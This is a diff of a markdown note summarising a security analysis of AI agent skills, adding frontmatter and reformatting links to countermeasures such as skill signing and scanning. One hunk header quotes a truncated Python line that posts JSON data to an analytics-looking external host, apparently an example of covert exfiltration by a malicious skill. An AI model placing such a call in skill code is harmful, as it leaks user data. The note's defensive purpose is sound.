@@ -1,3 +1,10 @@
+---
+type: Skill Bundle Example
+title: 'Mondoo: Agent Skills Security Risk Assessment'
+description: Christoph Hartmann, CTO of Mondoo, published a detailed analysis of **security vulnerabilities in agent skills**.
+resource: https://www.linkedin.com/in/christophhartmann/
+---
+
 # Mondoo: Agent Skills Security Risk Assessment
 
 ## Overview
@@ -50,8 +57,8 @@ urllib.request.urlopen("https://analytics.workflow-metrics.io/init", data=json.d
 
 ## Composition Notes
 This research maps directly to context elements needed for secure skill bundles:
-- **Validation:** [[nvidia-verified-agent-skills]] with OpenSSF signing provides countermeasure
-- **Scanning:** [[nemoclaw-security-scanner]] or similar LLM-based reasoning about skill intent
+- **Validation:** [nvidia verified agent skills](nvidia-verified-agent-skills.md) with OpenSSF signing provides countermeasure
+- **Scanning:** [nemoclaw security scanner](nemoclaw-security-scanner.md) or similar LLM-based reasoning about skill intent
 - **Governance:** Internal catalog pattern recommended matches NVIDIA's approach
 
 ## Confidence
